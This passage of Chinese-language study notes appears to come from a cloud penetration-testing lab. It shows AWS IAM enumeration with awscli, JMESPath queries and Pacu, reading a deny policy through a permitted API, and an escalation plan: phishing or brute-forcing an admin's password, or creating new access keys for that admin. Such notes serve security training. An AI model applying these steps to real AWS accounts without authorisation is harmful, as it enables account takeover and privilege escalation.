+└─$ aws --profile target iam list-attached-group-policies --group-name support
+
+{
+    "AttachedPolicies": [
+        {
+            "PolicyName": "SupportUser",
+            "PolicyArn": "arn:aws:iam::aws:policy/job-function/SupportUser"
+        }
+    ]
+}
+```
+> 該群組擁有 SupportUser IAM Policy，是一個 AWS Managed policy
+#### 4. 分析 SupportUser IAM 政策
+確認 SupportUser 的 IAM Policy 版本
+```
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile target iam list-policy-versions --policy-arn arn:aws:iam::aws:policy/job-function/SupportUser
+
+{
+    "Versions": [
+        {
+            "VersionId": "v8",
+            "IsDefaultVersion": true,
+            "CreateDate": "2023-08-25T18:40:27+00:00"
+        },
+        {
+            "VersionId": "v7",
+            "IsDefaultVersion": false,
+            "CreateDate": "2022-07-25T22:45:38+00:00"
+        },
+        ...
+```
+> 最新版本 v8，接下來可以下載政策的詳細內容
+
+取得 SupportUser 的 IAM Policy 內容
+```
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile target iam get-policy-version --policy-arn arn:aws:iam::aws:policy/job-function/SupportUser --version-id v8
+
+{
+    "PolicyVersion": {
+        "Document": {
+            "Version": "2012-10-17",
+            "Statement": [
+                {
+                    "Action": [
+                        "support:*",
+                        "acm:DescribeCertificate",
+                        "acm:GetCertificate",
+                        "acm:List*",
+                        "autoscaling:Describe*",
+                        "workspaces:Describe*"
+                    ],
+                    "Effect": "Allow",
+                    "Resource": "*"
+                    ...
+```
+> `support:*`: 完整存取 AWS Support Service\
+`acm:DescribeCertificate`: 可讀 AWS 憑證管理（ACM）\
+`autoscaling:Describe*`: 可讀 Auto Scaling 設定\
+`workspaces:Describe*`: 可讀 AWS Workspaces 設定\
+限制：該帳戶只能讀取（Describe, Get, List），不能創建或刪除資源。
+
+#### - 如果無法查詢 IAM 設定，如何測試權限？
+帳戶若無法查詢 IAM 權限，可以用 Brute-force Testing，執行 API 指令來嘗試獲取授權
+```
+pacu
+run iam__bruteforce_permissions --account-id 123456789012
+```
+
+## IAM Resources Enumeration
+AWS IAM (Identity and Access Management) 資源 Enumeration
+- 找出 IAM 使用者 (Users)、群組 (Groups)、角色 (Roles)
+- 確認 權限策略 (Policies) 允許進一步操作
+- 嘗試獲取 管理員權限 或發現可利用的 權限配置錯誤
+
+### Choosing Between a Manual or Automated Enumeration Approach
+- AWS IAM 枚舉：可使用 awscli、pacu
+- 雲端 OSINT ：可使用 cloud_enum、Amass
+- 權限測試：可使用 enumerate-iam、PMapper
+
+>[!Note]
+>目前已掌握的資訊
+>![image](https://hackmd.io/_uploads/SJXQBYZ3kl.png)\
+>`clouddesk-plove` 屬於 support 群組，並繼承了 SupportUser AWS 預設的管理策略 (AWS Custom-Managed Policy)
+
+#### 1. 查詢該帳號可用的 IAM 權限
+使用 `aws iam get-policy-version` 來檢查 SupportUser 這個 Policy，並透過 grep "iam" 來篩選 IAM 相關權限
+```
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile target iam get-policy-version --policy-arn arn:aws:iam::aws:policy/job-function/SupportUser --version-id v8 | grep "iam"
+                        "iam:GenerateCredentialReport",
+                        "iam:GenerateServiceLastAccessedDetails",
+                        "iam:Get*",
+                        "iam:List*",
+```
+> `所有 Get* 開頭的 IAM API`: 可以讀取 IAM 相關的資訊\
+`所有 List* 開頭的 IAM API`: 可以列出 IAM 相關資源\
+`iam:GenerateCredentialReport`: 產生 IAM 憑證報告\
+`iam:GenerateServiceLastAccessedDetails`: 產生服務最近存取詳細資訊
+
+#### 2. 查詢 AWS CLI 支援的 IAM 指令
+使用 `aws iam help | grep -E "list-|get-|generate-"` 來查詢有哪些 `list-`、`get-` 或 `generate-` 指令可以用來蒐集資訊
+```
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile target iam help | grep -E "list-|get-|generate-"
+
+       o generate-credential-report
+       o generate-organizations-access-report
+       o generate-service-last-accessed-details
+       o get-access-key-last-used
+       o get-account-authorization-details
+       o get-account-password-policy
+       o get-account-summary
+       o get-context-keys-for-custom-policy
+       o get-context-keys-for-principal-policy
+       o get-credential-report
+       o get-group
+       ...    
+```
+> 蒐集 IAM 資源的詳細資訊
+
+#### 3. 枚舉 IAM 資源
+##### 3.1 查詢 AWS 帳戶總覽
+`get-account-summary` 查詢 AWS 帳號內的 IAM 設定
+```
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile target iam get-account-summary | tee account-summary.json
+
+{
+    "SummaryMap": {
+        "GroupPolicySizeQuota": 5120,
+        "InstanceProfilesQuota": 1000,
+        "Policies": 8,
+        "GroupsPerUserQuota": 10,
+``` 
+> 帳號內有 18 個 IAM 使用者, 8 個 IAM 群組, 20 個 IAM 角色 ...
+
+##### 3.2 查詢所有 IAM 使用者、群組、角色
+```
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile target iam list-users | tee users.json
+aws --profile target iam list-groups | tee groups.json
+aws --profile target iam list-roles | tee roles.json
+
+{
+    "Users": [
+        ...
+```
+> admin-alice 這個 IAM 帳號可能具有管理權限\
+admin 群組 可能擁有更高的存取權限
+##### 3.3 查詢 IAM Policy (管理權限)
+```
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile target iam list-policies --scope Local --only-attached | tee policies.json
+{
+    "Policies": [
+        {
+            "PolicyName": "manage-credentials",
+            "PolicyId": "ANPAQOMAIGYU3LK3BHLGL",
+            "Arn": "arn:aws:iam::123456789012:policy/manage-credentials",
+            "Path": "/",
+            "DefaultVersionId": "v1",
+            "AttachmentCount": 1,
+            "PermissionsBoundaryUsageCount": 0,
+            "IsAttachable": true,
+            "UpdateDate": "2023-10-19T15:45:59+00:00"
+        },
+...
+```
+#### - Bypass 限制策略
+`clouddesk-plove` 使用者被限制存取某些資源
+```
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile target iam list-attached-user-policies --user-name clouddesk-plove
+
+{
+    "AttachedPolicies": [
+        {
+            "PolicyName": "deny_challenges_access",
+            "PolicyArn": "arn:aws:iam::{Account ID}:policy/deny_challenges_access"
+        }
+    ]
+}
+
+```
+> `deny_challenges_access` 會阻止我們存取某些資源
+
+試圖檢視這個 policy
+```
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile target iam list-policy-versions --policy-arn arn:aws:iam::123456789012:policy/deny_challenges_access
+```
+> AccessDenied
+
+#### - 利用其他指令繞過限制
+雖然 `list-policy-versions` 被阻擋，但 `get-account-authorization-details` 仍可使用
+```
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile target iam get-account-authorization-details --filter LocalManagedPolicy
+...
+"PolicyName": "deny_challenges_access",
+"Statement": [
+    {
+        "Action": "*",
+        "Effect": "Deny",
+        "Condition": {
+            "StringEquals": {
+                "aws:ResourceTag/challenge": "true"
+            }
+        }
+    }
+]
+```
+> 成功讀取到 deny_challenges_access 的內容且發現這個 Policy 會封鎖所有 `challenge: true` tag
+
+### Processing API Response data with JMESPath
+[JMESPath](https://jmespath.org/) 用於查詢 JSON 的語言，並透過 AWS CLI 的 `--query` 參數來使用，以篩選 API 回應中的 JSON 資料
+#### - 查詢所有使用者名稱
+```
+aws --profile target iam get-account-authorization-details --filter User --query "UserDetailList[].UserName"
+```
+#### - 同時查詢多個欄位
+- 陣列格式：
+```
+aws --profile target iam get-account-authorization-details --filter User --query "UserDetailList[0].[UserName,Path,GroupList]"
+```
+- 物件格式：
+```
+aws --profile target iam get-account-authorization-details --filter User --query "UserDetailList[0].{Name: UserName, Path: Path, Groups: GroupList}"
+```
+![image](https://hackmd.io/_uploads/BykujK-n1e.png)
+#### - 過濾包含特定關鍵字的使用者
+選出 UserName 包含 "admin" 的所有使用者
+```
+aws --profile target iam get-account-authorization-details --filter User --query "UserDetailList[?contains(UserName, 'admin')].{Name: UserName}"
+```
+#### - 同時篩選 IAM 使用者與群組
+```
+aws --profile target iam get-account-authorization-details --filter User Group --query "{Users: UserDetailList[?Path=='/admin/'].UserName, Groups: GroupDetailList[?Path=='/admin/'].{Name: GroupName}}"
+```
+#### - 將查詢結果存成檔案後處理
+能夠減少 API 請求次數，避免產生過多 log
+```
+aws --profile target iam get-account-authorization-details --filter User > users.json
+jp "UserDetailList[].UserName" < users.json
+```
+### Running Automated Enumeration with Pacu
+Pacu 是一款專門用來進行 AWS 滲透測試 的工具，它包含多個模組來自動化偵查 AWS 環境，包括 IAM 資源、EC2 資源、S3 bucket等。
+```
+sudo apt update
+sudo apt install pacu
+pacu
+import_keys {aws profile} #AWS IAM 憑證
+```
+#### - 列出 Pacu 內的所有可用模組
+`ls` 顯示所有可用的模組
+```
+Pacu (offseclab:imported-challenge) > ls
+
+[Category: LATERAL_MOVE]
+
+  cloudtrail__csv_injection
+  organizations__assume_role
+  sns__subscribe
+  vpc__enum_lateral_movement
+
+[Category: RECON_UNAUTH]
+
+  ebs__enum_snapshots_unauth
+```
+#### - module 用途與執行
+```
+Pacu (offseclab:imported-challenge) > help iam__enum_users_roles_policies_groups
+
+iam__enum_users_roles_policies_groups written by Spencer Gietzen of Rhino Security Labs.
+
+usage: pacu [--users] [--roles] [--policies] [--groups]
+
+This module requests the info for all users, roles, customer-managed policies, and groups in
+the account. If no arguments are supplied, it will enumerate all four, if any are supplied, it
+will enumerate those only.
+
+options:
+  --users     Enumerate info for users in the account
+  --roles     Enumerate info for roles in the account
+  --policies  Enumerate info for policies in the account
+  --groups    Enumerate info for groups in the account
+
+Pacu (offseclab:imported-challenge) > run iam__enum_users_roles_policies_groups 
+```
+#### - 檢視 Pacu 存入的資料
+當 Pacu 執行某些動作時，它會將資料存入自己的 內部資料庫，使用者可以隨時調閱這些資料。
+```
+Pacu (enumlab:imported-target) > services
+  IAM
+
+Pacu (enumlab:imported-target) > data IAM
+{
+  "Groups": [
+    {
+      "Arn": "arn:aws:iam::123456789012:group/admin/admin",
+      "GroupId": "AGPAQOMAIGYUZQMC6G5NM",
+      "GroupName": "admin",
+      "Path": "/admin/"
+    },
+    {
+      "Arn": "arn:aws:iam::123456789012:group/amethyst/amethyst_admin",
+      "GroupId": "AGPAQOMAIGYUYF3JD3FXV",
+      "GroupName": "amethyst_admin",
+      "Path": "/amethyst/"
+    },
+...
+```
+>[!Tip]
+>自動化列舉的優勢與限制:
+Pacu 透過模組 自動化執行 AWS CLI 指令，例如 `aws iam list-users` 或 `aws iam list-roles`\
+但 它無法繞過 IAM 權限： 如果已洩露的 IAM 憑證本身沒有權限讀取 IAM 設定，Pacu 也無法獲取資料。且 Pacu 會產生 AWS CloudTrail 記錄，這可能會引起 alert。
+
+### Extracting Insights from Enumeration Data
+從 AWS IAM (Identity and Access Management) 的資源枚舉 (enumeration) 資訊中提取關鍵資訊
+#### 1. 分析 IAM 用戶 "admin-alice"
+透過 `get-account-authorization-details` 查詢 admin-alice 用戶的詳細資訊
+```
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile target iam get-account-authorization-details --filter User Group --query "UserDetailList[?UserName=='admin-alice']"
+
+[
+    {
+        "Path": "/admin/",
+        "UserName": "admin-alice",
+        "UserId": "AIDAWZJ7PTI566KLAK2KS",
+        "Arn": "arn:aws:iam::{Account ID}:user/admin/admin-alice",
+        "CreateDate": "2025-03-14T09:30:06+00:00",
+        "GroupList": [
+            "admin",
+            "amethyst_admin"
+        ],
+        "AttachedManagedPolicies": [],
+        "Tags": [
+            {
+                "Key": "ce1df3c0-33f8-4eac-bb8a-356a133b3ac0",
+                "Value": "ce1df3c0-33f8-4eac-bb8a-356a133b3ac0"
+            },
+            {
+                "Key": "Project",
+                "Value": "amethyst"
+            }
+        ]
+    }
+]
+```
+> user 屬於 `/admin/` 路徑，且用戶名稱包含 "admin"，這可能表示具有較高權限\
+admin-alice 隸屬於兩個群組：`admin` 與 `amethyst_admin`\
+Tag 顯示 Project=amethyst
+>> admin-alice 沒有直接附加的 policies，可能繼承群組權限\
+Tag 可能會影響權限控制 (ABAC, Attribute-Based Access Control)，也就是 IAM 許可可能依據 tag 決定哪些資源可被存取
+
+#### 2. 分析 IAM 群組權限
+查詢 admin 群組 和 amethyst_admin 群組 的權限
+```
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile target iam get-account-authorization-details --filter User Group --query "GroupDetailList[?GroupName=='admin']"
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile target iam get-account-authorization-details --filter User Group --query "GroupDetailList[?GroupName=='amethyst_admin']"
+```
+#### 3. 分析 amethyst_admin 策略
+接續檢查 amethyst_admin 群組的 policy
+```
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile target iam get-account-authorization-details --filter LocalManagedPolicy --query "Policies[?PolicyName=='amethyst_admin']"
+```
+>[!Warning]
+>The use of the "*" wildcard in a policy often raises concerns regarding the potential over-permissiveness of that policy.
+
+#### 4. 確定攻擊路徑
+1. 透過 admin-alice 提升權限
+    - 嘗試獲取 admin-alice 的登入憑證（如社交工程、密碼暴力破解）。
+    - 直接以 admin-alice 身份進入 AWS 控制台並執行管理操作。
+2. 透過 amethyst_admin 群組成員提升權限
+    - 嘗試獲取 amethyst_admin 群組成員的存取金鑰 (如 admin-cbarton)。
+    - 利用 `iam:CreateAccessKey` 許可，為 admin-alice 建立新存取金鑰，取得完整管理員權限。
+
+![image](https://hackmd.io/_uploads/B18DM5Wn1g.png)
+
+# Attacking AWS Cloud Infrastructure
 
